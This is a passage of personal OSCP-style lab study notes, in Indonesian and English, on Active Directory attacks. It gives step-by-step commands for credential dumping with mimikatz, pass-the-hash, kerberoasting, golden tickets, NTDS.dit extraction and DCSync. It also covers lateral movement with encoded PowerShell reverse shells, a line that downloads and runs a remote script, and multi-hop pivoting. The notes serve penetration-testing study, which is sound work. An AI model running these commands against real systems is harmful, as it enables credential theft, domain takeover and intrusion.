sekurlsa::logonpasswords
```
> Dapet NTLM maria.
2a944a58d4ffa77137b2c587e6ed7626

7) Try to psexec ke DC
```bash
impacket-psexec -hashes :2a944a58d4ffa77137b2c587e6ed7626 maria@192.168.241.70
```
> Masuk. Coba crack harusnya bs juga sih. RDP juga bisa cuma ada security mechanismnya.
```bash
xfreerdp /u:maria /d:corp.com /v:192.168.241.70 /pth:2a944a58d4ffa77137b2c587e6ed7626 /dynamic-resolution /cert:ignore +clipboard
```
OS{35d2a59acb242439560906b6825ac68d}


## AD Attack Capstone 2
>> We got a password VimForPowerShell123! and a potential user `meg` and `backupuser`

1) Spray against the IPs
```bash
crackmapexec smb ips.txt -u users.txt -p 'VimForPowerShell123!' -d corp.com --continue-on-success
nxc smb ips.txt -u users.txt -p 'VimForPowerShell123!' -d corp.com --continue-on-success
```
>> Sepertinya cuma meg valid ke client75, web04, dc1, client74, files04
>> Gk ada yg pwned

2) Try to RDP. cannot. Try psexec, cannot as well.
3) Try ASREP Roasting
```bash
impacket-GetNPUsers -dc-ip 192.168.241.70 -request -outputfile hashes.asreproast corp.com/meg
```
> Dave is asreproastable

4) Try kerberoasting
```bash
sudo impacket-GetUserSPNs -request -dc-ip 192.168.241.70 corp.com/meg
```
> backupuser and iis_service is kerberoastable
> backupuser belongs to http/files04.corp.com

5) Try to crack backupuser and iis_service since more suspicious
```bash
sudo hashcat -m 13100 kerberoast.hashes /opt/wordlists/rockyou.txt -r custom.rule --force
```
iis_service:Strawberry1 >> Bisa RDP ke 192.168.241.72
backupuser:DonovanJadeKnight1 >> Gk bisa RDP ke 192.168.241.73

6) Enum dari iis service. (RDP or psexec)
```cmd
net group "Domain Admins" /domain
```
>> backupuser dan jeffadmin == Domain Admins
>> Try to psexec to dc as backupuser
```cmd
impacket-psexec corp.com/backupuser:DonovanJadeKnight1@192.168.241.70
```
> Kena account lockout, revert mesinnya aja.

7) Try again, and we are in the DC.
```cmd
impacket-psexec corp.com/backupuser:DonovanJadeKnight1@192.168.241.70
```
OS{d6f195286c8aa428b632645d0f1ccd85}


# Lateral Movement in Active Directory [PENTING]
(Get a command execution di computer lain)
Keywords: OverPassTheHash Over Pass The Hash (OPTH), PTH, PTT (Pass the ticket), winrs, PSRemoting, Powershell Remoting

>> xfreerdp /v:192.168.241.74 /dynamic-resolution /u:jeff /p:'HenchmanPutridBonbon11' /cert:ignore +clipboard

## WMIC and WinRM [PENTING]

1) Code exec with wmic from CLIENT74 to CLIENT73
```cmd
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
```
```cmd (wmic code exec script)
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
$Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```
2) Code exec with winrs
>> **For WinRS to work, the domain user needs to be part of the Administrators or Remote Management Users group on the target host.**
```cmd
winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"

-r >> Hostname target

winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
> revshell

winrs -r:files04 -u:jen -p:Nexus123! cmd 
> Kyk CRTP
```
3) Powershell Remoting
```cmd
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName 192.168.50.73 -Credential $credential

Get-PSSession >>> List sessionnya
Enter-PSSession 1 >>> Masuk ke sessionnya
```
>>> Lab Exercise, move laterally to web04:
> Gk bisa winrs karena iis_service bukan member dari Remote Management Users di web04 (gw tau setelah coba masuk dari yg lain).
> Kerberoast, crack iis_service ==> Strawberry1
> wmic RCE
```cmd
$username = 'iis_service';
$password = 'Strawberry1';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName 192.168.229.72 -Credential $credential -SessionOption $Options
$Command = 'powershell -e JABzAD0AJwAxADkAMgAuADEANgA4AC4ANAA1AC4AMQA2ADgAOgA1ADUANQA1ACcAOwAkAGkAPQAnAGQAMgA3ADkAYgA3AGQAYgAtAGYAMwAyADEAYwA5ADMAN....................AAtAGEAOAA0AGEAZQBlADUAMgAnADsAJABwAD0AJwBoAHQAdABwADoALwAvACUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AEIAeQB0AGUAcwAoACQAZQArACQAcgApACAALQBqAG8AaQBuACAAJwAgACcAKQB9ACAAcwBsAGUAZQBwACAAMAAuADgAfQA=';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```
>> GINI JUGA BISA!
```cmd
wmic /node:192.168.229.72 /user:iis_service /password:Strawberry1 process call create "REVSHELL"
```
>> PSRemoting juga bisa
```cmd
$username = 'iis_service';
$password = 'Strawberry1';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName 192.168.229.72 -Credential $credential
Enter-PSSession 1
```

## PsExec [PENTING] (ada di /opt/PSTools/PsExec64.exe Kali)
>> SELALU COBA PAKE INI, KADANG YG BISA INI DOANG.

Prerequisite bisa make:
1. First, the user that authenticates to the target machine needs to be part of the Administrators local group.
2. Second, the ADMIN$ share must be available.
3. Third, File and Printer Sharing has to be turned on.

1) Remoting with PsExec
```cmd
./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
```
Exercise:
```cmd
./PsExec64.exe -i  \\WEB04 -u corp\jen -p Nexus123! cmd
```

## Pass the Hash (PTH)
>> Use NTLM hash and only work for servers or services using NTLM authentication.
Prerequisite:
1. It requires an SMB connection through the firewall (commonly port 445)
2. The Windows File and Printer Sharing feature to be enabled
3. This lateral movement technique also requires the admin share called ADMIN$ to be available. 

1) PTH Using impacket
```bash
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth >> BISA PASS THE HASH JUGA
proxychains impacket-mssqlclient -hashes :e728ecbadfb02f51ce8eed753f3ff3fd celia.almeda@10.10.151.142 -windows-auth
impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```
>> Pake impacket-wmiexec, impacket-smbexec, impacket-psexec, evil-winrm juga bisa.


## Over Pass the Hash (OPTH) [PENTING]
(SELALU COBA PAKE PSEXEC.EXE JGN CUMA WINRS DAN PSREMOTING)

>> Dia yang pake kerberos dan mimikatz, kemudian inject ticket, jadinya kita bisa psremoting, wmic rce, or winrs
>> Abusing NTLM user hash to gain a full Kerberos TGT. We can then use TGT to gain TGS.

1) Get the NTLM hash of a logged on user session
```cmd
mimikatz.exe "privilege::debug"
mimikatz.exe "sekurlsa::logonpasswords"
```
2) Launch the over pass the hash
```cmd
mimikatz.exe "sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell"
```
>> Harusnya ntar akan kebuka powershell baru. Itu udah terauthenticate sebagai jen
>> Kalo coba `klist` akan kosong. This is expected since jen has not yet performed an interactive login.

3) Kalau kita coba interaksi, baru akan muncul (dari yg new powershell session).
```cmd
net use \\files04
klist
```
>> The output has the Kerberos tickets, including the TGT and a TGS for the Common Internet File System (CIFS) service.
>> We know that ticket #0 is a TGT because the server is krbtgt.

4) Karena di ps-session yang baru kita udah sebagai jen. Kita bisa PsExec, winrs, wmic, PSRemoting tanpa credentials sebagai jen.
```cmd
.\PsExec.exe \\files04 cmd
or
winrs -r:files04 cmd 
or
$sess = New-PSSession -ComputerName files04.corp.com
Get-PSSession
Enter-PSSession $sess
```
Exercise:
```cmd
mimikatz.exe "sekurlsa::pth /user:Administrator /domain:corp.com /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:powershell"
```
>> SOMEHOW DIA CUMA BISA PAKE `.\PsExec.exe \\web04 cmd`. Gk bisa pake winrs dan PS Remoting.


## Pass the Ticket (PTT)
The Pass the Ticket attack takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service. In addition, if the service tickets belong to the current user, then no administrative privileges are required.

1) Check ada akses ke target apa ngga
```cmd
whoami
ls \\web04\backup
```
>> Harusnya denied, dave punya akses ke sana. Cari ticketnya dave.

2) Export all the TGT/TGS from memory
```cmd
privilege::debug
sekurlsa::tickets /export
```
3) Cari ticket yang kita mau (AMBIL YG LATEST)
```cmd
dir *.kirbi

>> [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```
4) Inject ticket through mimikatz
```cmd
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
exit
```
5) Check the ticket
```cmd
klist
```
6) Harusnya skrng ada akses ke resource yg kita mau
```cmd
ls \\web04\backup
```
>> Real attack, cari ticket admin. Remoting aja ke sana.

## DCOM (Distributed Component Object Model)
The Microsoft Component Object Model (COM) is a system for creating software components that interact with each other. While COM was created for either same-process or cross-process interaction, it was extended to Distributed Component Object Model (DCOM) for interaction between multiple computers over a network.

1) From Elevated Powershell
```cmd
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))

$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")

192.168.50.73 >> Target IP (FILES04)
```
2) Revshell
```cmd
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
```
Exercise:
```cmd
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.229.72"))

$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"iex (New-Object Net.WebClient).DownloadString('http://192.168.45.168/Invoke-PowerShellTcpEx.ps1')","7")
```

# Active Directory Persistence

## Golden Ticket
> krbtgt aes256 hash or NTLM.
> If we can get our hands on the krbtgt password hash, we could create our own self-made custom TGTs, also known as golden tickets.
> The golden ticket will require us to have access to a Domain Admin's group account or to have compromised the domain controller itself to work as a persistence method.

>> Coba akses DC pasti gk bisa. `PsExec64.exe \\DC1 cmd.exe`

1) Extract krbtgt Hash and Domain SID
```cmd
mimikatz.exe "privilege::debug"
mimikatz.exe "lsadump::lsa /patch"
```
>> Ambil KRBTGT hash and domain SID (dari whoami /user juga bisa)

2) Purge ticket biar works well
```cmd
mimikatz.exe "kerberos::purge"
```
3) Create golden ticket
```cmd
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
```
/user >> Di sini adalah user mana yg mau diinject golden ticket. Rada beda dengan CRTP. Pas CRTP itu krbtgt yang diinject.

```cmd (HARUS BUKA CMD BARU DARI MIMIKATZNYA, BIAR KITA PAKE SESSION YG SUDAH TERINJECT)
misc::cmd
```

4) Sekarang harusnya bisa akses DC
```cmd
PsExec64.exe \\DC1 cmd.exe

whoami
whoami /groups (kita harusnya domain admin)

Kalo kita coba connect pake IP (IPnya DC) akan diblock. Krn malah force pake NTLM instead of the ticket

psexec.exe \\192.168.50.70 cmd.exe
```

## Shadow Copies
A Shadow Copy, also known as Volume Shadow Service (VSS) is a Microsoft backup technology that allows the creation of snapshots of files or entire volumes.

As domain admins, we can abuse the vshadow utility to create a Shadow Copy that will allow us to extract the Active Directory Database NTDS.dit database file. Once we've obtained a copy of the database, we need the SYSTEM hive, and then we can extract every user credential offline on our local Kali machine.

1. Create backup of the system (`where vshadow.exe`)
```cmd
vshadow.exe -nw -p  C:
```
>> Liat path "Shadow copy device name"
ex: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2

2) Copy ntds.dit
```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
```

3) Get the system.bak (ini yg didump pake impacket-secretsdump itu, ntds.dit dan system.bak)
```cmd
reg.exe save hklm\system c:\system.bak
```

4) Dump secrets with impacket DUMP SAM WITH IMPACKET
https://www.bordergate.co.uk/extracting-windows-credentials-using-native-tools/
```cmd
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

-security >> GK WAJIB
```
>> SELALU CHECK windows.old directory.

## AD Lateral Capstone 1 
1) DCSync
```cmd
lsadump::dcsync /user:corp\Administrator
```
>> 2892d26cdf84d7a70e2eb3b9f05c425e

2) Pass the hash
```cmd
impacket-psexec -hashes :2892d26cdf84d7a70e2eb3b9f05c425e Administrator@192.168.229.70
```
OS{f984cc0e469a0538378ba9005046b8de}

## AD Lateral Capstone 2
1) sekurlsa::logonpasswords
jeffadmin:e460605a9dbd55097c6cf77af2f89a03

2) impacket-psexec -hashes :e460605a9dbd55097c6cf77af2f89a03 jeffadmin@192.168.229.73
OS{4dc6701ec4fb601725ea1731db5d4e07}

## AD Lateral Capstone3
1) Find-DomainShare >> Cari sharesnya
\\web04\backup
2) Coba Pass the Ticket
```cmd
sekurlsa::tickets /export
dir *.kirbi
>> [0;2f6a79]-0-0-40810000-dave@cifs-web04.kirbi
kerberos::ptt [0;2f6a79]-0-0-40810000-dave@cifs-web04.kirbi
```
OS{14c900ae84b6f953201207db084c6cd7}

3) Tadi gw juga kerberoast, dapet hashnya iis_service. iis_service itu owner web harusnya. Ke crack.
`iis_service:Strawberry1`. Taunya dari check SPN `Get-NetUser -SPN`, since gw pikir web itu service.
4) Dan bisa masuk juga ke web04. Dapet juga flagnya kalo gini.
`impacket-psexec iis_service:Strawberry1@192.168.229.72 `

Kesimpulan: AD itu bnyk jalan menuju Roma.


# Assembling The Pieces (Challenge Lab #0) - Final Module (kyk exam)
>> Coba kerjain sendiri dulu aja di Google Docs buat practice. Nanti baru liat Module.
https://docs.google.com/document/d/10ZfatfkI5rpJ43V_s4z25KiRSFszlrtpcAY4kfYXMcI/edit?usp=sharing




# PIVOTING WITH CHISEL (EXPERIMENT SENDIRI) [PENTING, WORKS] CHISEL, DOUBLE PIVOTING WITH CHISEL.
## Nmap command for chisel
```cmd
sudo proxychains nmap -sT -sV -Pn -n -vvv 10.185.10.27 -oA nmap/10.185.10.27
```
## Buat tau IP second pivotnya ping sweep (pingsweep) dari foothold aja
```cmd
Linux:
for i in $(seq 254); do ping 10.1.2.${i} -c1 -W1& done | grep from

Windows (powershell):
1..254 | % {"192.168.1.$($_): $(Test-Connection -count 1 -comp 192.168.1.$($_) -quiet)"}

Windows (cmd):
(for /L %a IN (1,1,254) DO ping /n 1 /w 3 192.168.2.%a) | find "Reply" > ping_only_replies.txt
```

> BUAT EXAM LIAT INI AJA
> TINGGAL SESUAIN ARSITEKTUR MESIN SAMA BINARY CHISELNYA.
> How to get revshellnya, liat yg catetan john hammond

1) Transfer chisel_amd64 ke confluence machine (foothold)
2) Open chisel server on kali.
```bash
chisel server --socks5 --reverse -p 9999
```
3) Connect socks dari confluence machine (foothold) ke kali
```bash
./chisel_amd64 client 192.168.45.168:9999 R:1080:socks
```
4) Tambahin /etc/proxychains.conf
```
socks5 127.0.0.1 1080
```
5) Sekarang bisa SSH ke postgresql server dari kali (ke kaki lain dari confluence)
```bash
proxychains ssh database_admin@10.4.198.215
```
6) For double pivot, buka server python3 di confluence (foothold / first pivot), transfer ke posgresql server (second pivot)
7) Open chisel server on confluence machine (foothold)
```bash
./chisel_amd64 server -p 8002 --reverse
```
8) Connect socks dari postgresql server machine (second pivot) ke confluence machine (foothold)
```bash
./chisel_amd64 client 10.4.198.63:8002 R:2080:socks
```
9) Tambahin /etc/proxychains.conf
```bash
socks5 127.0.0.1 1080
socks5 127.0.0.1 2080
```
10) Sekarang juga bisa akses kaki-kaki di postgresql server lewat kali. Begitu aja terus sampe 5 pivot.
```bash
proxychains smbclient -L //172.16.198.217/ -U hr_admin --password=Welcome1234
proxychains ./ssh_dynamic_client -i 172.16.198.217 -p 4872
```


# Pivoting with Chisel 
https://www.youtube.com/watch?v=pbR_BNSOaMk&ab_channel=JohnHammond
https://ap3x.github.io/posts/pivoting-with-chisel/ (HTB Prolabs Dante)
https://github.com/jpillora/chisel/releases
```bash
curl https://i.jpillora.com/chisel! | bash
```

Scenario, kita udah dapet foothold di mesin pertama, misal 10.1.1.10, tapi ternyata pas kita check (ifconfig or ip -a) dia ada kaki lain di 10.1.2.4 yang cuma bisa diakses dari 10.1.1.10, jadi Kali Linux kita gk bisa komunikasi ke sana.

Dari sini kita bisa asumsi si mesin 10.1.1.10 yang kita sudah takeover bisa akses subnet 10.1.2.1/24 juga (or berapapun subnetnya tergantung subnet masknya).

1. Discovering another active machine using ping sweep (pingsweep), on the foothold machine
```bash
Linux:
for i in $(seq 254); do ping 10.1.2.${i} -c1 -W1& done | grep from

Windows (powershell):
1..254 | % {"192.168.1.$($_): $(Test-Connection -count 1 -comp 192.168.1.$($_) -quiet)"}

Windows (cmd):
(for /L %a IN (1,1,254) DO ping /n 1 /w 3 192.168.2.%a) | find "Reply" > ping_only_replies.txt
```

2. How to use our Kali tools on the second machine
## Method 1, Transferring static binary to the foothold box (Faster but limited tools and tools might be not reliable)
```bash
https://github.com/andrew-d/static-binaries/tree/master/binaries
/opt/static-binaries/binaries/linux/x86_64
```
ex:
>>> Download the Nmap 
```bash
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap
```
>>> Make executable
```bash
chmod +x nmap
```
>>> Transfer it to the foothold machine, 
```bash
scp nmap pivot@10.1.1.10:/tmp
```
>>> Use the Nmap on the foothold machine
```bash
./nmap 10.1.2.5
```

## Method 2, SOCAT + Chisel and proxychains (Slower but we can use all of our kali tools)

>> Download Latest Chisel
```bash
cd /opt/chisel
curl https://i.jpillora.com/chisel! | bash
```

>> Create a symlink to that chisel so we can easily transfer it
```bash
ln -s /usr/local/bin/chisel chisel
```

>> Transfer the chisel
```bash
scp chisel pivot@10.1.1.10:/tmp
```

### Portforwarding with chisel (PORT FORWARDING WITH CHISEL)

>>> Jadi, ntar akan butuh 2 chisel. Chisel server dan client. Chisel server ditaro di Kali kita buat listen, dan Chisel client kita jalanin di foothold machine kita dalam mode **reverse**
```bash (Kali side)
chisel server --socks5 --reverse -p 9999

Notice ada fingerprintnya abis kita jalanin command. Fingerprintnya adalah special key yang digunakan untuk mengidentify chisel server kita.
```

```bash (Foothold machine side)
./chisel client --fingerprint <fingerprint_chisel_server_kali> <ip_kali_kita>:9999 R:8000:10.1.2.5:80

R >> Reverse
8000 >> Kita mau port 8000 di mesin kali linux kita, buat jadi port yang akan dipake buat akses 10.1.2.5 di port 80.
```

>>> Sekarang harusnya kita bisa visit port 80 dari 10.1.2.5 dari kali linux kita dengan visit http://localhost:8000. Sama juga yg lain, mau SSH or RDP tinggal ganti target dan portnya aja.


### SOCKS Proxy and Proxychains >> NAH INI YG PENTING

>>> Sama kyk tadi, tapi dari client tinggal ganti jadi R:socks
```bash (Kali side)
chisel server --socks5 --reverse -p 9999
```
```bash (Foothold machine side)
./chisel client --fingerprint <fingerprint_chisel_server_kali> <ip_kali_kita>:9999 R:1080:socks

Liat port socksnya, harusnya 1080
> No fingerprint juga gpp
```

>>> Sekarang kita bisa akses SEMUA yang foothold machine bisa akses dari Kali linux kita. BUT, kita harus setup proxychains dulu.
```bash
sudo subl /etc/proxychains.conf

Ubah contentnya sesuai port yang sudah kita specify tadi di chisel client

socks5 127.0.0.1 1080
```
BENER 127.0.0.1 JGN PAKE IP VPN

>>> Sekarang kita bisa akses semua port or services yang ada di 10.1.2.5 dari Kali Linux. Tinggal tambahin `proxychains` di setiap command kita
```bash
proxychains curl http://10.1.2.5
```

>>> TAPI Proxychainsnya kan cuma bisa buat CLI tools. Gimana caraliatnya di GUInya juga? Or gmn kalo kita mau pake Burpsuite atau interact dengan webnya? BISA! Jawabannya **TINGGAL SETUP PROXY DI WEB BROWSERNYA, ATAU PAKE FOXYPROXY AJA**
```
Foxyproxy
>> Add new proxy
>> Proxy Type > SOCKS5
>> IP Address > 127.0.0.1
>> Port 1080 (sesuai dengan port yang kita setup)
```

3. Accessing RDP
```bash
proxychains xfreerdp /v:10.1.2.6 /u:Administrator
```

**4. Gaining reverse shell to our Kali Linux from the second pivot machine or subnet (HOW TO GET REVSHELL?)** >> PENTINGG!! TERBUKTI GUNA DI OSCPB

>> Biarin socks proxy di mesin foothold kita jalan. *Buka another session lagi di mesinnya dan jalanin chisel lagi.*
```bash (Foothold machine)
./chisel client --fingerprint <fingerprint_chisel_server_kali> <ip_kali_kita>:9999 0.0.0.0:5555:<ip_kali_kita>:5555

Jadi kyk, segala yang connect Foothold machine kita di port 5555 akan dimapping ke ip_kali_kita di port 5555. 

Jadi tinggal reverse shell dari second pivot ke IP foothold machine kita ke port 5555 dan kita tinggal set listener di port 5555
```

>> Revese shell using hoaxshell.py (Windows reverse shell payload generator and handler that abuses the http(s) protocol to establish a beacon-like reverse shell)
```bash
python hoaxshell.py -s 10.1.2.4 -p 5555

10.1.2.4 >> IP foothold machine kita yang ada di subnet yang bisa komunikasi dengan second pivot machine kita.
```
>> Copy powershell syntaxnya buat revshellnya dan Paste di target machine Windows kita

>> Boom! hoaxshell akan dapet koneksi and Voila! Kita dapet reverse shell connection dari **second pivot** machine ke Kali Linux kita.

```bash (di sisi kali kita)
Kalo buat linux harusnya tinggal gini aja

proxychains sudo nc -lnvp 5555

Terus tinggal revshell ke IP foothold machine kita.
```

5. **DOUBLE PIVOT**
>> Same concept, tinggal pake chisel server di Foothold machine
```bash (Foothold machine)
./chisel server -p 8002 --reverse
```
>> Di second pivot machine, tinggal chisel client lagi
```bash (second pivot)
chisel.exe client <ip_foothold_machine>:8002 R:2080:socks
```
>> Tambahin proxychains.conf di kali linux kita jadi
```
socks5 127.0.0.1 1080 
socks5 127.0.0.1 2080 
```

>> Reverse shell to our kali from the **third pivot** machine?
```bash (second pivot machine)
chisel.exe client --fingerprint <fingerprint_chisel_server_di_foothold_machine> <ip_foothold>:8002 0.0.0.0:4444:<ip_foothold>:4444

Agar segala yang connect ke second pivot di port 4444 akan diforward ke foothold machine di port 4444.
```
```bash (foothold machine)
./chisel client --fingerprint <fingerprint_chisel_server_kali> <ip_kali_kita>:9999 0.0.0.0:4444:<ip_kali_kita>:4444

Agar segala yang connect ke foothold machine di port 4444 akan diforward ke ip_kali_kita di port 4444
```
>> Tinggal reverse shell dari third pivot ke second pivot di port 4444. Kali Linux listening on port 4444

>> Diagram

Third Pivot >> revshell >> Second Pivot >> Forward >> Foothold >> Forward >> Kali Linux (Listening with proxychains)


6. **TRIPLE PIVOT**
>> Exactly same concept. Ke second pivot machine, buka chisel server
```bash (Second pivot)
chisel.exe server -p 8003 --reverse
```
>> Di third pivot machine, tinggal pake chisel client lagi
```bash (Third pivot)
chisel.exe client <ip_second_pivot_machine>:8003 R:3080:socks
```
>> Tambahin proxychains.comf di kali linux kita jadi
```
socks5 127.0.0.1 1080 
socks5 127.0.0.1 2080 
socks5 127.0.0.1 3080 
```

>> Reverse shell to our kali from the **fourth pivot** machine?
```bash (third pivot machine)
chisel.exe client --fingerprint <fingerprint_chisel_server_di_second_pivot> <ip_second_pivot>:8003 0.0.0.0:3333:<ip_second_pivot>:3333

Agar segala yang connect ke third pivot di port 3333 akan diforward ke second pivot machine di port 3333.
```
```bash (second pivot machine)
chisel.exe client --fingerprint <fingerprint_chisel_server_di_foothold_machine> <ip_foothold>:8002 0.0.0.0:3333:<ip_foothold>:3333

Agar segala yang connect ke second pivot machine di port 3333 akan diforward ke foothold machine di port 3333
```
```bash (foothold machine)
./chisel client --fingerprint <fingerprint_chisel_server_kali> <ip_kali_kita>:9999 0.0.0.0:3333:<ip_kali_kita>:3333

Agar segala yang connect ke foothold machine di port 3333 akan diforward ke ip_kali_kita di port 3333
```
>> Tinggal reverse shell dari fourth pivot ke third pivot di port 3333

>> Diagram

Fourth Pivot >> revshell >> Third Pivot >> Forward >> Second Pivot >> Forward >> Foothold >> Forward >> Kali Linux (Listening with proxychains)


## Remote mouse // Wifi mouse exploit
>> .decode("hex") itu gk bisa harus difix
>> Ganti jadi bytes.fromhex()



# The Metasploit Framework [ILLEGAL PAS EXAM, CUMA BOLEH DI 1 MESIN AJA]
> Males nyatet, liat module pen-200 aja. Setup DB msfconsole dll, pake postgres.
> Modulenya lengkap bahas semua module, auxiliary, exploit, etc. Paling catet yg baru aja.

## Staged vs Non-staged Payloads
Scenario: Buffer Overflow. As we learned in Fixing Exploits, we need to be aware of the buffer size our shellcode will be stored in. If the shellcode size of our exploit exceeds the buffer size, our exploit attempt will fail. In a situation like this, it's vital which payload type we choose: staged or non-staged.

> Staged > A staged payload is usually sent in two parts. The first part contains a small primary payload that causes the victim machine to connect back to the attacker, transfer a larger secondary payload containing the rest of the shellcode, and then execute it.

> Non-staged > A non-staged payload is sent in its entirety along with the exploit. This means the payload contains the exploit and full shellcode for a selected task. In general, these "all-in-one" payloads are more stable. The downside is that the size of these payloads will be bigger than other types.

*There are several situations in which we would prefer to use a staged payload instead of non-staged. If there are space-limitations in an exploit, a staged payload might be a better choice as it is typically smaller. In addition, we need to keep in mind that antivirus software can detect shellcode in an exploit. By replacing the full code with a first stage, which loads the second and malicious part of the shellcode, the remaining payload is retrieved and injected directly into the victim machine's memory. This may prevent detection and can increase our chances of success.*

Bedain mana yg staged, mana yg non-staged dari slashnya ('/') yg paling belakang.
>> payload/linux/x64/shell/reverse_tcp >> Staged
>> payload/linux/x64/shell_reverse_tcp >> Non Staged

**All Meterpreter payloads are staged**
> Tapi kenapa ada yg meterpreter/reverse_tcp dan meterpreter_reverse_tcp?
The difference between those two types is how the Meterpreter payload is transferred to the target machine. The non-staged version includes all components required to launch a Meterpreter session while the staged version uses a separate first stage to load these components.

> Tiap kita jalanin "shell" di meterpreter, itu dia bikin channel.
meterpreter > channel -l
meterpreter > channel -i 1
meterpreter > lpwd (pake prefix l itu di local jalaninnya)
meterpreter > lcd /home/nox/Downloads (BISA PINDAH, biar upload dan download gampang)
meterpreter > lpwd
meterpreter > download /etc/passwd
meterpreter > upload /usr/bin/unix-privesc-check /tmp/

linux/x64/meterpreter_reverse_https 
>> Payload yg ada httpsnya, Instead of a raw TCP connection, this payload uses HTTPS to establish the connection and communication between the infected target and our Kali machine. As the traffic itself is encrypted with SSL/TLS, **defenders will only obtain information about HTTPS requests. Without further defensive techniques and technologies, they will be unlikely to decipher the Meterpreter communication.**

>> OHH KENAPA PAYLOAD MSFVENOM KITA SUKA RUSAK? ADA CONNECTION TAPI NO SHELL. ITU KARENA **NETCAT GK BISA TERIMA PAYLOAD STAGED**
>> Jadi have to make sure kalo generate payload pake msfvenom buat DLL or malicious services, HARUS NON-STAGED.
>> Kalo mau terima payload staged, harus pake multi handler. HARUSNYA PAS EXAM INI BOLEH.

>> Inget eCPPTv2, shell pivot metasploit harus bind.



# Ligolo-ng - DYNAMIC PORT FORTWARDING
https://www.youtube.com/watch?v=DM1B8S80EvQ&ab_channel=GonskiCyber

- Ligolo Proxy: Yang disetup di kali linux
- Ligolo Agent: Yang dikirim ke target

## Setup Ligolo (On Kali)
```cmd
$ sudo ip tuntap add user [your_username] mode tun ligolo
>> sudo ip tuntap add user shatternox mode tun ligolo

$ sudo ip link set ligolo up
```

1) Start ligolo proxy on Kali
```cmd
cd ligolo-ng_proxy_0.5.2_linux_arm64
./proxy -h  (See help option)
./proxy -selfcert
```
>> Liat port listeningnya, defaultnya 11601

2) On Target (this example windows)
```cmd
agent.exe -connect <kali_ip>:11601 -ignore-cert
```
>> Memang rada lama (gk instant), tapi ntar connect

3) On Kali linux on Ligolo proxy, check session
```cmd
ligolo-ng >> help
ligolo-ng >> session (Akan muncul session-session yang connect)

Pilih 1 buat ke session yang barusan connect.
Ntar kita bisa jalanin command di targetnya

[Agent name for MS01] >> ifconfig
```

4) On Kali, setup route (buat socks proxy)
```cmd
sudo ip route add 10.10.120.0/24 dev ligolo

sudo ip route del 10.10.120.0/24 dev ligolo (ini buat delete)
```
>> 10.10.120.0/24 == Kaki lain di agent 1 yang unreachable dari Kali, mau pivot ke sana.

```cmd
ip route list (buat view ip routing yang sudah kita set)
```

5) On Kali on Ligolo proxy, start tunneling
```cmd
ligolo-ng >> session
1
[Agent name for MS01] >> start 
```
